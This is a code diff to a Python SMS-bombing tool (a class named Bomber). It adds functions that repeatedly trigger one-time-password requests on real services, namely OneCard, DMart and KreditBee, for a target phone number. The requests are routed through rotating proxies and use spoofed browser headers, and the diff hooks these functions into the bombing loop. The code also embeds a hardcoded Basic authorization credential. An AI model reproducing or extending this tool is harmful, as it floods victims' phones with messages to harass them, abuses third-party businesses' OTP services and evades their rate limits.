@@ -573,6 +573,99 @@ class Bomber:
             'accept': "application/json",
             'content-type': "application/json",
         }
+        try:
+            request = requests.request("POST", url, data=payload, headers=headers, proxies={
+                'https': self.getproxy()})
+        except:
+            return False
+        if(request.status_code == 400):
+            return True
+
+    def onecard(self):
+        url = "https://card.fplabs.tech:9000/onecard/bff/open/v1/web/otp/generate"
+        payload = "{\"mobile\":"f'"{self.user_mobile}"'",\"deviceType\":\"WEB\",\"whatsappConsent\":false}"
+        headers = {
+            'authority': "card.fplabs.tech:9000",
+            'accept': "application/json, text/plain, */*",
+            'accept-language': "en-US,en;q=0.9",
+            'authorization': "Basic ZnBsYWJzOjFGUExhYnMyMzIw",
+            'content-type': "application/json",
+            'data_attributes': "",
+            'dnt': "1",
+            'origin': "https://apply.getonecard.app",
+            'partner_name': "",
+            'referer': "https://apply.getonecard.app/",
+            'sec-fetch-dest': "empty",
+            'sec-fetch-mode': "cors",
+            'sec-fetch-site': "cross-site",
+            'user-agent': "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Mobile Safari/537.36 Edg/102.0.1245.33",
+            'utm_campaign': "Web_TopNavOS_ApplyNow",
+            'utm_id': "TopNavOS_ApplyNow",
+            'utm_medium': "TopNavOS_Apply_Now",
+            'utm_source': "OneScore Website"
+        }
+        try:
+            request = requests.request("POST", url, data=payload, headers=headers, proxies={
+                'https': self.getproxy()})
+        except:
+            return False
+        if(request.status_code == 400):
+            return True
+
+    def dMart(self):
+        url = "https://digital.dmart.in/api/v1/secure/otp"
+
+        payload = "{\"userId\":"f'"{self.user_mobile}"'",\"resendOtp\":\"true\"}"
+        headers = {
+            'authority': "digital.dmart.in",
+            'accept': "application/json, text/plain, */*",
+            'accept-language': "en-US,en;q=0.9",
+            'content-type': "application/json",
+            'dm_token': "",
+            'dnt': "1",
+            'origin': "https://www.dmart.in",
+            'sec-fetch-dest': "empty",
+            'sec-fetch-mode': "cors",
+            'sec-fetch-site': "same-site",
+            'storeid': "10151",
+            'user-agent': "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Mobile Safari/537.36 Edg/102.0.1245.33"
+        }
+        try:
+            request = requests.request("POST", url, data=payload, headers=headers, proxies={
+                'https': self.getproxy()})
+        except:
+            return False
+        if(request.status_code == 400):
+            return True
+
+    def kreditBee(self):
+        url = "https://api.kreditbee.in/v1/me/otp"
+
+        querystring = {"reason": "loginOrRegister",
+                       "mobile": f"{self.user_mobile}"}
+
+        payload = ""
+        headers = {
+            'authority': "api.kreditbee.in",
+            'accept': "application/json, text/plain, */*",
+            'accept-language': "en-US,en;q=0.9",
+            'authorization': "Bearer null",
+            'dnt': "1",
+            'origin': "https://pwa-web1.kreditbee.in",
+            'referer': "https://pwa-web1.kreditbee.in/",
+            'sec-fetch-dest': "empty",
+            'sec-fetch-mode': "cors",
+            'sec-fetch-site': "same-site",
+            'user-agent': "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Mobile Safari/537.36 Edg/102.0.1245.33",
+            'x-kb-info': "eyJkaWQiOiIiLCJhcHB0eXBlIjoid2ViIiwiYXBwdmVyIjoiIn0="
+        }
+        try:
+            request = requests.request("GET", url, data=payload, headers=headers, params=querystring, proxies={
+                'https': self.getproxy()})
+        except:
+            return False
+        if(request.status_code == 400):
+            return True
 
     def startBombing(self):
         if(self._checkinternet()):
@@ -625,6 +718,12 @@ class Bomber:
                 if self.confirmtkt():
                     counter += 1
                 if self.ajio():
+                    counter += 1
+                if self.onecard():
+                    counter += 1
+                if self.kreditBee():
+                    counter += 1
+                if self.dMart():
                     counter += 1
 
                 if(counter >= self.number_of_messege):
